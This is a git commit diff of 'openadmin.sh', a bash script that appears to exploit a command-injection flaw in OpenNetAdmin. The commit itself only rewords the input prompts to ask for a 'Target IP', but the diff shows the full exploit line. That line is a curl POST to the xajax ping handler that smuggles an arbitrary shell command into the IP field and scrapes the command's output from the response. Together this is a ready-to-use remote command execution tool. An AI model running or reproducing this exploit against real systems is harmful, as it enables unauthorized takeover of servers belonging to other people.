384218d1def69cf15c962d647dd228d90272b7fb
MAALP1225 <51253666+MAALP1225@users.noreply.github.com>
2020-01-21 17:03:13 +0530

    Update openadmin.sh

--- openadmin.sh
+++ openadmin.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 #Author: MAALP
-read -p "Enter Your IP:- " IP
-read -p  "Enter Your command :- " cmd
+read -p "Enter Target IP:- " IP
+read -p  "Enter command :- " cmd
 OUT=`curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${IP}" | sed -n -e "/BEGIN/,/END/ p" | tail -n +2 | head -n -1`
 if [ -z "$OUT" ]
 then
